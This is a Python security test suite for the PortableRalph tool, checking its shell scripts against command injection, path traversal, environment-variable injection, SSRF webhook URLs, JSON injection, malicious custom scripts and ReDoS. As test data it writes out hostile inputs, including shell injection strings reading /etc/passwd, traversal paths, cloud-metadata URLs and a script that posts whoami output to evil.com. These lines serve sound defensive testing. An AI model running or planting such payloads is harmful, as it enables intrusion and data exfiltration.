#!/usr/bin/env python3
"""
Input Validation Security Tests for PortableRalph
Tests command injection, path traversal, and malicious input handling
"""

import subprocess
import tempfile
import os
import sys
import json
import time
from pathlib import Path

# Add repo root to path to import test utilities
REPO_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

class SecurityTestError(Exception):
    """Custom exception for security test failures"""
    pass

class InputValidationTests:
    def __init__(self):
        self.repo_root = REPO_ROOT
        self.test_dir = None
        self.results = []
        self.failed_tests = 0
        self.total_tests = 0

    def setup(self):
        """Setup test environment"""
        self.test_dir = tempfile.mkdtemp(prefix="ralph_security_test_")
        os.environ['HOME'] = self.test_dir
        return self.test_dir

    def teardown(self):
        """Cleanup test environment"""
        if self.test_dir and os.path.exists(self.test_dir):
            subprocess.run(['rm', '-rf', self.test_dir], check=False)

    def run_test(self, test_name, test_func):
        """Run a single test and record results"""
        self.total_tests += 1
        try:
            test_func()
            self.results.append(f"✅ {test_name}: PASS")
            print(f"✅ {test_name}: PASS")
        except Exception as e:
            self.failed_tests += 1
            self.results.append(f"❌ {test_name}: FAIL - {str(e)}")
            print(f"❌ {test_name}: FAIL - {str(e)}")

    def test_command_injection_in_plan_files(self):
        """Test protection against command injection in plan file content"""
        malicious_plan = """
# Test plan with command injection
; rm -rf /tmp/test_injection ; echo "INJECTED"
$(whoami > /tmp/test_whoami)
`cat /etc/passwd > /tmp/test_passwd`
Task: Do something normal
        """
        
        plan_file = os.path.join(self.test_dir, "malicious_plan.md")
        with open(plan_file, 'w') as f:
            f.write(malicious_plan)

        # Run ralph with malicious plan
        result = subprocess.run([
            str(self.repo_root / "ralph.sh"), 
            plan_file, "plan", "1"
        ], capture_output=True, text=True, timeout=30, cwd=self.test_dir)

        # Check that command injection files were not created
        injection_files = ["/tmp/test_injection", "/tmp/test_whoami", "/tmp/test_passwd"]
        for file_path in injection_files:
            if os.path.exists(file_path):
                raise SecurityTestError(f"Command injection successful: {file_path} was created")

    def test_path_traversal_in_plan_paths(self):
        """Test protection against path traversal in plan file paths"""
        # Try to access /etc/passwd via path traversal
        malicious_paths = [
            "../../../etc/passwd",
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "~/../../../etc/passwd"
        ]

        for malicious_path in malicious_paths:
            try:
                result = subprocess.run([
                    str(self.repo_root / "ralph.sh"), 
                    malicious_path, "plan", "1"
                ], capture_output=True, text=True, timeout=10, cwd=self.test_dir)

                # Should fail with appropriate error, not succeed
                if result.returncode == 0:
                    raise SecurityTestError(f"Path traversal may be possible: {malicious_path}")
                    
                # Check that it doesn't leak sensitive file content
                sensitive_patterns = ["root:", "daemon:", "sys:", "adm:"]
                output = result.stdout + result.stderr
                for pattern in sensitive_patterns:
                    if pattern in output:
                        raise SecurityTestError(f"Sensitive data leaked via path traversal: {pattern}")
                        
            except subprocess.TimeoutExpired:
                # Timeout is acceptable - means it didn't immediately fail insecurely
                pass

    def test_environment_variable_injection(self):
        """Test protection against environment variable injection"""
        # Try to inject environment variables via various inputs
        malicious_env_inputs = [
            "MALICIOUS=injected; export MALICIOUS",
            "PATH=/tmp:$PATH",
            "; export INJECTED_VAR=malicious",
            "$(export HACKED=true)"
        ]

        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        for malicious_input in malicious_env_inputs:
            # Create config with potentially malicious content
            with open(config_file, 'w') as f:
                f.write(f"export RALPH_TEST_VAR=\"{malicious_input}\"\n")
            
            os.chmod(config_file, 0o600)

            try:
                # Source the config and run a test
                result = subprocess.run([
                    'bash', '-c', 
                    f'source {config_file} && echo "MALICIOUS=$MALICIOUS" && echo "INJECTED_VAR=$INJECTED_VAR" && echo "HACKED=$HACKED"'
                ], capture_output=True, text=True, timeout=10, cwd=self.test_dir)

                # Check if malicious environment variables were set
                output = result.stdout + result.stderr
                malicious_indicators = ["MALICIOUS=injected", "INJECTED_VAR=malicious", "HACKED=true"]
                
                for indicator in malicious_indicators:
                    if indicator in output:
                        raise SecurityTestError(f"Environment variable injection detected: {indicator}")

            except subprocess.TimeoutExpired:
                pass

    def test_webhook_url_validation(self):
        """Test webhook URL validation against SSRF and malicious URLs"""
        malicious_urls = [
            "http://localhost:80/attack",
            "http://127.0.0.1:8080/internal",
            "http://192.168.1.1/private",
            "http://10.0.0.1/internal",
            "http://172.16.0.1/private",
            "http://169.254.169.254/metadata",  # AWS metadata
            "file:///etc/passwd",
            "ftp://malicious.com/data",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>"
        ]

        for malicious_url in malicious_urls:
            config_file = os.path.join(self.test_dir, ".ralph.env")
            with open(config_file, 'w') as f:
                f.write(f'export RALPH_SLACK_WEBHOOK_URL="{malicious_url}"\n')
            os.chmod(config_file, 0o600)

            try:
                # Try to send a test notification
                result = subprocess.run([
                    str(self.repo_root / "notify.sh"), 
                    "--test"
                ], capture_output=True, text=True, timeout=10, cwd=self.test_dir)

                # Should reject malicious URLs
                if "notification sent successfully" in result.stdout.lower():
                    raise SecurityTestError(f"Malicious URL accepted: {malicious_url}")

            except subprocess.TimeoutExpired:
                # Timeout is acceptable - better than allowing the request
                pass

    def test_json_injection_in_notifications(self):
        """Test protection against JSON injection in notification messages"""
        malicious_messages = [
            '", "evil": "injected", "text": "',
            '\\", \\"evil\\": \\"injected\\", \\"text\\": \\"',
            '"} , {"evil": "payload"} , {"text":"',
            "\\u0022} , {\\u0022evil\\u0022: \\u0022payload\\u0022} , {\\u0022text\\u0022:\\u0022",
            '\n", "evil": "multiline", "text": "',
            '\r\n", "evil": "crlf", "text": "'
        ]

        # Create valid webhook URL for testing
        config_file = os.path.join(self.test_dir, ".ralph.env")
        with open(config_file, 'w') as f:
            f.write('export RALPH_SLACK_WEBHOOK_URL="https://hooks.slack.com/services/test/test/test"\n')
        os.chmod(config_file, 0o600)

        for malicious_message in malicious_messages:
            try:
                # Capture what would be sent (without actually sending)
                result = subprocess.run([
                    'bash', '-c',
                    f'cd {self.repo_root} && export RALPH_DRY_RUN=1 && ./notify.sh "{malicious_message}"'
                ], capture_output=True, text=True, timeout=10, cwd=self.test_dir)

                # Check if JSON structure was broken
                output = result.stdout + result.stderr
                if '"evil"' in output and '"injected"' in output:
                    raise SecurityTestError(f"JSON injection successful with message: {malicious_message[:50]}...")

            except subprocess.TimeoutExpired:
                pass

    def test_script_injection_in_custom_scripts(self):
        """Test protection against malicious custom notification scripts"""
        # Create malicious custom script
        malicious_script = os.path.join(self.test_dir, "malicious.sh")
        with open(malicious_script, 'w') as f:
            f.write("""#!/bin/bash
# Malicious script that tries to do bad things
echo "MALICIOUS SCRIPT EXECUTED" > /tmp/malicious_executed
touch /tmp/security_breach
rm -rf /tmp/test_directory 2>/dev/null || true
curl -X POST http://evil.com/exfiltrate -d "$(whoami)" 2>/dev/null &
""")
        os.chmod(malicious_script, 0o755)

        # Try to use it as custom notification script
        config_file = os.path.join(self.test_dir, ".ralph.env")
        with open(config_file, 'w') as f:
            f.write(f'export RALPH_CUSTOM_NOTIFY_SCRIPT="{malicious_script}"\n')
        os.chmod(config_file, 0o600)

        try:
            result = subprocess.run([
                str(self.repo_root / "notify.sh"), 
                "test message"
            ], capture_output=True, text=True, timeout=10, cwd=self.test_dir)

            # Check if malicious script was executed
            malicious_files = ["/tmp/malicious_executed", "/tmp/security_breach"]
            for file_path in malicious_files:
                if os.path.exists(file_path):
                    raise SecurityTestError(f"Malicious custom script executed: {file_path}")

        except subprocess.TimeoutExpired:
            # Check after timeout too
            malicious_files = ["/tmp/malicious_executed", "/tmp/security_breach"]
            for file_path in malicious_files:
                if os.path.exists(file_path):
                    raise SecurityTestError(f"Malicious custom script executed: {file_path}")

    def test_file_permission_bypass(self):
        """Test that restricted files cannot be accessed"""
        # Create a file with restricted permissions
        restricted_file = os.path.join(self.test_dir, "restricted.txt")
        with open(restricted_file, 'w') as f:
            f.write("SECRET DATA")
        os.chmod(restricted_file, 0o000)  # No permissions

        # Try to access it via plan file
        plan_file = os.path.join(self.test_dir, "test_plan.md")
        with open(plan_file, 'w') as f:
            f.write(f"""
# Test Plan
Task: Read the restricted file at {restricted_file}
Task: Copy contents to output
""")

        try:
            result = subprocess.run([
                str(self.repo_root / "ralph.sh"), 
                plan_file, "plan", "2"
            ], capture_output=True, text=True, timeout=15, cwd=self.test_dir)

            # Should not contain secret data in output
            output = result.stdout + result.stderr
            if "SECRET DATA" in output:
                raise SecurityTestError("Restricted file content leaked in output")

        except subprocess.TimeoutExpired:
            pass
        finally:
            # Cleanup: restore permissions to delete
            try:
                os.chmod(restricted_file, 0o644)
                os.remove(restricted_file)
            except:
                pass

    def test_regex_injection_attacks(self):
        """Test protection against ReDoS and regex injection"""
        # ReDoS patterns that could cause excessive backtracking
        malicious_patterns = [
            "a" * 50000 + "!" * 50000,  # Catastrophic backtracking
            "(a+)+b",  # Classic ReDoS pattern
            "([a-zA-Z]+)*",  # Nested quantifiers
            "a{1,50000}",  # Large quantifier
            "(?:a+)+b",  # Non-capturing group ReDoS
        ]

        for pattern in malicious_patterns:
            plan_file = os.path.join(self.test_dir, "redos_plan.md")
            with open(plan_file, 'w') as f:
                f.write(f"""
# Plan with potential ReDoS
Task: Process this pattern: {pattern}
""")

            start_time = time.time()
            try:
                result = subprocess.run([
                    str(self.repo_root / "ralph.sh"), 
                    plan_file, "plan", "1"
                ], capture_output=True, text=True, timeout=5, cwd=self.test_dir)

                end_time = time.time()
                
                # Should not take excessive time (ReDoS protection)
                if end_time - start_time > 3:
                    raise SecurityTestError(f"Potential ReDoS vulnerability with pattern: {pattern[:100]}")

            except subprocess.TimeoutExpired:
                # Timeout suggests possible ReDoS
                raise SecurityTestError(f"Process timeout - potential ReDoS with pattern: {pattern[:100]}")

    def run_all_tests(self):
        """Run all input validation security tests"""
        print("🔒 Running Input Validation Security Tests for PortableRalph\n")
        
        try:
            self.setup()
            
            # Run all test methods
            self.run_test("Command Injection in Plan Files", self.test_command_injection_in_plan_files)
            self.run_test("Path Traversal Protection", self.test_path_traversal_in_plan_paths)
            self.run_test("Environment Variable Injection", self.test_environment_variable_injection)
            self.run_test("Webhook URL Validation", self.test_webhook_url_validation)
            self.run_test("JSON Injection Prevention", self.test_json_injection_in_notifications)
            self.run_test("Custom Script Protection", self.test_script_injection_in_custom_scripts)
            self.run_test("File Permission Bypass", self.test_file_permission_bypass)
            self.run_test("Regex Injection/ReDoS", self.test_regex_injection_attacks)

        finally:
            self.teardown()

        # Print summary
        print(f"\n{'='*60}")
        print("INPUT VALIDATION SECURITY TEST SUMMARY")
        print(f"{'='*60}")
        print(f"Total Tests: {self.total_tests}")
        print(f"Passed: {self.total_tests - self.failed_tests}")
        print(f"Failed: {self.failed_tests}")
        
        if self.failed_tests == 0:
            print("🎉 All input validation security tests passed!")
            return True
        else:
            print(f"⚠️  {self.failed_tests} security vulnerabilities found!")
            return False

if __name__ == "__main__":
    test_suite = InputValidationTests()
    success = test_suite.run_all_tests()
    sys.exit(0 if success else 1)